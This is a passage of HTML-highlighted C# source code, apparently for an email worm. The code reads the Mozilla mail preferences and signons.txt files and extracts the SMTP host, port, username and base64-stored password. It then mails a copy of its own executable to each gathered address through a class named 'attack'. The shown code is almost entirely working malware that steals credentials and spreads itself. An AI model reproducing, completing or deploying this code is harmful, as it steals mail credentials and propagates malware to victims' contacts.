                </span><span class="sc11">signons</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"signons.txt"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">settings</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">prefs</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">settings</span><span class="sc10">.</span><span class="sc11">ReadToEnd</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">passread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signons</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">signon_content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">passread</span><span class="sc10">.</span><span class="sc11">ReadToEnd</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">check_smtp</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">content</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"mail.smtpserver.smtp1"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">getdata</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Win32NT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">separate1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">"\\);\r\nuser_pref\\(\""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">None</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">separate1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">"\\);\nuser_pref\\(\""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">None</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">separate2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">", "</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">separate3</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">"\\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nuser_pref</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">separate1</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">content</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">nuser_pref</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pref</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"mail.smtpserver.smtp1.port"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">separate2</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">pref</span><span class="sc10">)[</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"\""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pref</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"mail.smtpserver.smtp1.hostname"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">separate2</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">pref</span><span class="sc10">)[</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"\""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pref</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"mail.smtpserver.smtp1.username"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">separate2</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">pref</span><span class="sc10">)[</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"\""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">signon_list</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">separate3</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">signon_content</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">signon_list</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">signon_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"smtp://"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"@"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%40"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"@"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">password_base64</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signon_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">].</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"~"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">password</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">FromBase64String</span><span class="sc10">(</span><span class="sc11">password_base64</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">sendmail</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">title</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">MailMessage</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"@"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"@"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">Subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">title</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">Body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">AddAttachment</span><span class="sc10">(</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetEntryAssembly</span><span class="sc10">().</span><span class="sc11">Location</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">Smtp</span><span class="sc0"> </span><span class="sc11">smtp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">Smtp</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Go</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">gather</span><span class="sc0"> </span><span class="sc11">info</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">gather</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">user</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">homefolder</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">available</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">attack</span><span class="sc0"> </span><span class="sc11">server</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">attack</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">.</span><span class="sc11">check_smtp</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc11">server</span><span class="sc10">.</span><span class="sc11">getdata</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">Exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">addresses</span><span class="sc10">.</span><span class="sc11">ToArray</span><span class="sc10">())</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Sending to "</span><span class="sc10">+</span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">create</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">create</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Content -&gt; "</span><span class="sc10">+</span><span class="sc11">content</span><span class="sc10">.</span><span class="sc11">content</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">server</span><span class="sc10">.</span><span class="sc11">sendmail</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc10">.</span><span class="sc11">content</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc10">.</span><span class="sc11">title</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
